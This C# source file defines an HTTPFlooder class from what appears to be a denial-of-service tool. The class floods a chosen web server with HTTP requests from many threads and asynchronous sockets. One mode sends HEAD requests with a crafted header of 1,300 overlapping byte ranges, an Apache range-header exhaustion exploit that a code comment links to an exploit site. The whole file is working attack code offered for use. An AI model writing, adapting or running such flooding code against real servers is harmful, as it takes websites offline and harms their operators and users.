#region Usings
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using GAS.Core.Tools;

#endregion
namespace GAS.Core.Attacks {
    public class HTTPFlooder : IAttacker {
        #region Shit
        private const int BUFFER_SIZE = 32;
        readonly byte[] _buffer;//don't use for anything if you are not Nostradamus
        IPEndPoint _riep;
        #endregion
        #region Variables
        bool _init;
        private readonly IPAddress _ip;
        private readonly string _dns;
        private readonly string _subsite;
        private readonly bool _random;
        private readonly bool _usegZip;
        private readonly bool _ipOrDns = true;
        private readonly bool _resp;
        private readonly Thread[] _workingThreads;
        private volatile int _attacktype, _spt = 1;
        private volatile string _attackHeader = "";
        #endregion
        public HTTPFlooder( string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip, int threadcount, int attacktype = 0, int connectionsPerThread = 1 ) {
            this._buffer = new byte[ BUFFER_SIZE ];
            this.ThreadCount = threadcount;
            this._workingThreads = new Thread[ this.ThreadCount ];
            this.IsDelayed = false;
            try { this._ip = IPAddress.Parse( ip ); }
            catch {
                try {
                    this._ip = Dns.GetHostAddresses( dns )[ 0 ];
                }
                catch { this._ipOrDns = false; }
            }
            try { this._dns = dns; }
            catch { this._dns = this._ip.ToString(); }
            this.Port = port;
            this._subsite = subSite;
            this._resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this._random = random;
            this._usegZip = usegzip;
            this.States = new ReqState[ this.ThreadCount ];
            this._spt = connectionsPerThread;
            this._attacktype = attacktype;
        }
        public override void Start() {
            if ( this.IsFlooding )
                this.Stop();
            this.IsDelayed = false;
            this.IsFlooding = true;
            var temp = new StringBuilder( 6000 );
            for ( var k = 0; k < 1300; temp.Append( ",5-" + ( k++ ) ) ) { }
            this._attackHeader = temp.ToString();
            for ( var i = 0; i < this.ThreadCount; i++ )
                ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i );
            this._init = true;
        }
        private void bw_DoWork( object indexinthreads ) {
            while ( !this._init ) Thread.Sleep( 100 );//_i know it's bad 
            var myIndexForWork = (int) indexinthreads;
            this.AsyncAttack( myIndexForWork );
        }
        private void NoSyncAttack( int myIndexForWork ) {
            try {
                #region Shit
                const int bfsize = 1024; // this should be less than the MTU
                var recvBuf = new byte[ bfsize ];
                var buf = this.GetHeaderBytes();
                while ( this.IsFlooding ) {
                    if ( this._random ) buf = this.GetHeaderBytes();
                    this.States[ myIndexForWork ] = ReqState.Ready;
                    var socket = new RSocket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
                    try {
                #endregion
                        #region Connect
                        this.States[ myIndexForWork ] = ReqState.Connecting;
                        socket.Connect( this._ipOrDns ? this._ip.ToString() : this._dns, this.Port );
                        socket.Blocking = this._resp;
                        #endregion
                        #region Send
                        this.States[ myIndexForWork ] = ReqState.Requesting;
                        socket.Send( buf, SocketFlags.None );
                        #endregion
                        #region Start loading
                        this.States[ myIndexForWork ] = ReqState.Downloading;
                        this.Requested++;
                        if ( this._resp ) {
                            try {
                                do { socket.Receive( recvBuf, bfsize, SocketFlags.None ); }
                                while ( false );//(recvd > bfsize) && socket.Connected);
                                this.Downloaded++;
                            }
                            catch { this.Failed++; }
                        }
                        #endregion
                        this.States[ myIndexForWork ] = ReqState.Completed;
                        this.Downloaded++;
                        if ( this.Delay > 0 ) Thread.Sleep( this.Delay + 1 );
                        #region Cleans
                    }
                    catch ( Exception ) {
                    }
                    socket.Dispose();
                }
            }
            catch ( Exception ) { }
                        #endregion
        }
        private void AsyncAttack( int myIndexForWork ) {
            this._riep = new IPEndPoint( this._ip, this.Port );
            var fs = new AsyncFlooder[ this._spt ];
            for ( var i = 0; i < this._spt; i++ ) {
                fs[ i ] = new AsyncFlooder( this );
                fs[ i ].Start();
            }
            Thread.Sleep( System.Threading.Timeout.Infinite );
        }
        byte[] GetHeaderBytes() {
            if ( this._attacktype == 0 )
                return Encoding.ASCII.GetBytes(
                 String.Format( this._random ?
                 String.Concat( new[]{
 "GET {0}{1} HTTP/1.1{4}",
 "Host: {2}{4}",
 "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
 "{3}{4}"} )
                 :
                 String.Concat( new[]{  
 "GET {0} HTTP/1.1{4}",
 "Host: {2}{4}",
 "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
 "{3}{4}",
 "{4}"} ),
                this._subsite,
                Misc.RS(),
                this._dns,
                ( ( this._usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ),
                "\r\n"
                ) );
            //http://1337day.com/exploits/16729
            return Encoding.ASCII.GetBytes(
                String.Format( String.Concat( new[]{
                    "HEAD {0}{1} HTTP/1.1{4}",
                    "Accept: */*{4}",
                    "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}",
                    "{3}Host: {2}{4}"+"Range:bytes=0-{5}{4}",
                    "Connection: close{4}",
                    "{4}"} ),
                                this._subsite,
                                ( this._random ? Misc.RS() : null ),
                                this._dns,
                                ( this._usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null ),
                                Environment.NewLine,
                                this._attackHeader ) );
        }
        public override void Stop() {
            this.IsFlooding = false;
            try {
                foreach ( var x in this._workingThreads ) { try { x.Abort(); } catch { } }
            }
            catch { }
        }
        class AsyncFlooder {
            readonly SocketAsyncEventArgs _sConnect = new SocketAsyncEventArgs();
            readonly SocketAsyncEventArgs _sReceive = new SocketAsyncEventArgs();
            readonly SocketAsyncEventArgs _sDisconnected = new SocketAsyncEventArgs();
            private readonly RSocket _workingSocket = new RSocket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
            readonly HTTPFlooder _parent;
            public AsyncFlooder( HTTPFlooder h ) {
                this._parent = h;
            }
            void SConnectedBufSet() {
                var b = this._parent.GetHeaderBytes();
                this._sConnect.SetBuffer( b, 0, b.Length );
            }
            internal void Start() {
                #region Connect+send headers
                this.SConnectedBufSet();
                this._sConnect.SocketFlags = SocketFlags.None;
                this._sConnect.Completed += this.SConnected;
                this._sConnect.RemoteEndPoint = this._parent._riep;//working_socket.RemoteEndPoint;
                #endregion
                #region Receive answer
                this._sReceive.SetBuffer( this._parent._buffer, 0, BUFFER_SIZE );
                this._sReceive.SocketFlags = SocketFlags.None;
                this._sReceive.Completed += this.SCompleted;
                this._sReceive.RemoteEndPoint = this._parent._riep;// working_socket.RemoteEndPoint;
                #endregion
                #region Disconnect
                this._sDisconnected.SetBuffer( this._parent._buffer, 0, BUFFER_SIZE );
                this._sDisconnected.SocketFlags = SocketFlags.None;
                this._sDisconnected.Completed += this.SDisconnectedToAss;
                this._sDisconnected.RemoteEndPoint = this._parent._riep;// working_socket.RemoteEndPoint;
                this._sDisconnected.DisconnectReuseSocket = true;
                #endregion
                this._workingSocket.Blocking = this._parent._resp;
                try {
                    this._workingSocket.ConnectAsync( this._sConnect );
                }
                catch (Exception) { }
            }
            void SDisconnectedToAss( object sender, SocketAsyncEventArgs e ) {
                if ( !this._parent.IsFlooding ) {
                    this._workingSocket.Dispose();
                    return;
                }
                if ( this._parent.Delay > 0 ) Thread.Sleep( this._parent.Delay );
                try {
                    this.SConnectedBufSet();
                    this._workingSocket.ConnectAsync( this._sConnect );
                }
                catch ( Exception ex ) {
                    Console.WriteLine( ex.Message );
                }
            }
            void SCompleted( object sender, SocketAsyncEventArgs e ) {
                var suc = e.SocketError == SocketError.Success;
                if ( suc ) this._parent.Requested++;
                else this._parent.Failed++;
                if ( !this._parent.IsFlooding ) {
                    this._workingSocket.Dispose();
                    return;
                }
                try {
                    this._workingSocket.DisconnectAsync( this._sDisconnected );
                }
                catch { }
            }
            void SConnected( object sender, SocketAsyncEventArgs e ) {
                if ( !this._parent.IsFlooding ) {
                    this._workingSocket.Dispose();
                    return;
                }
                try {
                    this._workingSocket.ReceiveAsync( this._sReceive );
                }
                catch { }
            }
        }
    }
}